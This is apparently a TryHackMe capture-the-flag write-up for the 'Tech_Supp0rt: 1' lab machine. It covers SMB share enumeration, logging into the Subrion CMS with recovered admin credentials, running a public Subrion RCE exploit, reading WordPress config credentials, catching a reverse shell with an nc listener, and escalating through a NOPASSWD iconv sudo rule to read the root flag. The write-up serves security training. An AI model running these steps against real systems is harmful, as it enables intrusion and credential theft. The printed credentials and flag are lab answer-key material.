---
title: "TryHackMe - Tech_Supp0rt: 1"
published: 2026-08-15
description: "TryHackMe Tech_Supp0rt1 writeup — SMB share leaks, Subrion CMS RCE exploit, WordPress config credential recovery, and privilege escalation via a NOPASSWD iconv sudo rule (GTFOBins)."
image: "/assets/tech-supp0rt1/cover.png"
tags: [TryHackMe, Linux, SMB, Subrion CMS, WordPress, Privilege Escalation]
category: "TryHackMe"
draft: false
lang: "en"
---
## 1. Initial Enumeration

### Nmap Scan

```bash
nmap -sV 10.10.24.118
```

### Directory Enumeration

```bash
gobuster dir -u http://10.10.24.118 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

---

## 2. SMB Enumeration

List available SMB shares:

```bash
smbclient -L //10.10.24.118
```

Connect to the discovered share:

```bash
smbclient //10.10.24.118/websvr
```

Download files from the share:

```bash
mget enter.txt
```

When prompted, select:

```
yes
```

---

## 3. Web Application Enumeration

Browse to:

```
http://10.10.24.118/subrion/panel/
```

A login portal is presented.

Use CyberChef to analyze the discovered credentials and obtain:

```
Username: admin
Password: Scam2021
```

Login to the Subrion administration panel.

---

## 4. Exploit Discovery

Search for available exploits:

```bash
searchsploit Subrion 4.2.1
```

Copy the exploit locally:

```bash
searchsploit -m php/webapps/49876.py
```

Execute the exploit:

```bash
python 49876.py -u http://10.66.147.216/subrion/panel/ -l admin -p Scam2021
```

---

## 5. Credential Discovery

Inspect the WordPress configuration file:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Discovered database credentials:

```php
define('DB_USER', 'support');
define('DB_PASSWORD', 'ImAScammerLOL!123!');
```

---

## 6. Reverse Shell Access

### Uplpad phar revshell plugins in panal and nc run

Start a listener:

```bash
rlwrap nc -lvnp 1337
```

After receiving a shell, upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

---

## 7. User Access

Navigate to the home directory:

```bash
cd /home
```

Switch to the user account:

```bash
su scamsite
```

Password:

```
ImAScammerLOL!123!
```

Successful authentication grants access as:

```
scamsite
```

---

## 8. Privilege Escalation Enumeration

Check sudo permissions:

```bash
sudo -l
```

Output:

```
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

---

## 9. Root Flag Access

Set the target file:

```bash
LFILE=/root/root.txt
```

Read the file using the permitted binary:

```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

The contents of the root flag are displayed.

---

## Root Flag

```
851b8233a8c09400ec30651bd1529bf1ed02790b
```

---

# Summary

1. Performed service enumeration using Nmap.
2. Enumerated SMB shares and downloaded exposed files.
3. Discovered Subrion CMS administration portal.
4. Recovered administrative credentials.
5. Identified and executed a public Subrion exploit.
6. Obtained remote code execution and a reverse shell.
7. Extracted WordPress database credentials.
8. Accessed the `scamsite` user account.
9. Enumerated sudo permissions.
10. Leveraged the allowed `iconv` binary to access the root flag.